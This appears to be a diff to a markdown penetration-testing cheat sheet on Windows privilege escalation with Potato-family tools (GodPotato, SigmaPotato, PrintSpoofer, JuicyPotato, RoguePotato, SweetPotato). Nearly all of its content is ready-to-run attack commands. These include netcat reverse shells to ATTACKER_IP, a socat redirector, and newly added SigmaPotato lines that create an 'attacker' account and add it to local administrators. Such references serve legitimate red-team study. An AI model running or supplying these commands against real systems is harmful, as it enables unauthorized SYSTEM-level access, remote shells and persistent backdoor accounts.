@@ -49,26 +49,47 @@ It abuses **DCOM activation and token impersonation** to obtain a SYSTEM token.
 
 **Execute command as SYSTEM:**
 
-```
+```powershell
 GodPotato.exe -cmd "cmd /c whoami"
 ```
 
 **Spawn interactive shell:**
 
-```
+```powershell
 GodPotato.exe -cmd "cmd"
 ```
 
 **Spawn PowerShell:**
 
-```
+```powershell
 GodPotato.exe -cmd "powershell"
 ```
 
 **Reverse shell example:**
 
-```
+```powershell
 GodPotato.exe -cmd "nc.exe ATTACKER_IP 4444 -e cmd.exe"
+```
+
+### SigmaPotato
+
+`SigmaPotato` is a modern implementation that works reliably on many systems.
+
+**Execute command as SYSTEM:**
+```powershell
+.\SigmaPotato.exe "cmd /c whoami"
+```
+
+**Create user:**
+
+```powershell
+.\SigmaPotato.exe "net user attacker Pass123! /add"
+```
+
+**Add to administrators:**
+
+```powershell
+.\SigmaPotato.exe "net localgroup administrators attacker /add"
 ```
 
 ### PrintSpoofer
@@ -77,13 +98,13 @@ Works on many **Windows 10 and Windows Server builds** by abusing the **Print Sp
 
 **Execute:**
 
-```
+```powershell
 PrintSpoofer.exe -i -c cmd
 ```
 
 **Spawn PowerShell:**
 
-```
+```powershell
 PrintSpoofer.exe -i -c powershell
 ```
 
@@ -102,19 +123,19 @@ It abuses **COM service activation** using a SYSTEM service CLSID.
 
 **Basic syntax:**
 
-```
+```powershell
 JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
 ```
 
 Example CLSID:
 
-```
+```powershell
 JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
 ```
 
 Reverse shell example:
 
-```
+```powershell
 JuicyPotato.exe -l 1337 -p nc.exe -t * -c {CLSID} -a "ATTACKER_IP 4444 -e cmd.exe"
 ```
 
@@ -127,19 +148,19 @@ Requires a **redirector on the attacker machine**.
 
 **Attacker machine:**
 
-```
+```powershell
 socat tcp-listen:135,fork tcp:TARGET_IP:9999
 ```
 
 **Target machine:**
 
-```
+```powershell
 RoguePotato.exe -r ATTACKER_IP -e cmd.exe -l 9999
 ```
 
-Result:
+**Result:**
 
-```
+```powershell
 NT AUTHORITY\SYSTEM shell
 ```
 
@@ -154,7 +175,7 @@ SweetPotato integrates several token impersonation techniques.
 SweetPotato.exe -p cmd.exe
 ```
 
-Spawn PowerShell:
+**Spawn PowerShell:**
 
 ```
 SweetPotato.exe -p powershell.exe
